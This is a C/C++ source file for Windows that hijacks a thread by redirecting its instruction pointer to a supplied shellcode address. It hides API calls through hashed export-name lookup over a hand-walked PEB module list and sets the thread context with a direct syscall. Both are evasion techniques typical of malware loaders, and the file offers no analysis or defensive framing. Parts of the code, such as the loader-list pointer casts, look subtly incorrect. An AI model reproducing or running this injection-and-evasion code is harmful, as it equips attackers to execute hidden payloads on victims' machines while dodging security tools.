#include <windows.h>

// custom memory copy function
void my_memcpy(void *dest, const void *src, size_t n)
{
    char *d = (char *)dest;
    const char *s = (const char *)src;
    for (size_t i = 0; i < n; i++)
    {
        d[i] = s[i];
    }
}

// hash function to hide function names
DWORD HashString(const char *str)
{
    DWORD hash = 0;
    while (*str)
    {
        hash = (hash >> 13) | (hash << (32 - 13));
        hash += *str++;
    }
    return hash;
}

// find address of a function using its hash
void *GetAddressByHash(DWORD targetHash)
{
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InMemoryOrderModuleList.Flink;

    while (pLdrEntry->DllBase != NULL)
    {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pLdrEntry->DllBase;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)dos + dos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)dos + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD *names = (DWORD *)((BYTE *)dos + exp->AddressOfNames);
        for (DWORD i = 0; i < exp->NumberOfNames; i++)
        {
            char *funcName = (char *)((BYTE *)dos + names[i]);
            if (HashString(funcName) == targetHash)
            {
                DWORD *funcs = (DWORD *)((BYTE *)dos + exp->AddressOfFunctions);
                WORD *ords = (WORD *)((BYTE *)dos + exp->AddressOfNameOrdinals);
                return (void *)((BYTE *)dos + funcs[ords[i]]);
            }
        }
        pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pLdrEntry->InMemoryOrderLinks.Flink;
    }
    return NULL;
}

// external syscall from asm file
extern "C" NTSTATUS NtSetContextThread(HANDLE hThread, PCONTEXT Context);

// main function to hijack a thread
void ExecuteHijack(DWORD threadId, void *shellcode)
{
    // get openthread address using hash
    auto pOpenThread = (HANDLE(WINAPI *)(DWORD, BOOL, DWORD))GetAddressByHash(0x6F727339);
    HANDLE hThread = pOpenThread(THREAD_ALL_ACCESS, FALSE, threadId);

    // get suspendthread address using hash
    auto pSuspendThread = (DWORD(WINAPI *)(HANDLE))GetAddressByHash(0x6D45892D);
    pSuspendThread(hThread);

    // get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    auto pGetThreadContext = (BOOL(WINAPI *)(HANDLE, LPCONTEXT))GetAddressByHash(0xB3267793);
    pGetThreadContext(hThread, &ctx);

    // change rip to shellcode address
    ctx.Rip = (DWORD64)shellcode;

    // use direct syscall to set context
    NtSetContextThread(hThread, &ctx);

    // get resumethread address using hash
    auto pResumeThread = (DWORD(WINAPI *)(HANDLE))GetAddressByHash(0x1993C58B);
    pResumeThread(hThread);

    CloseHandle(hThread);
}
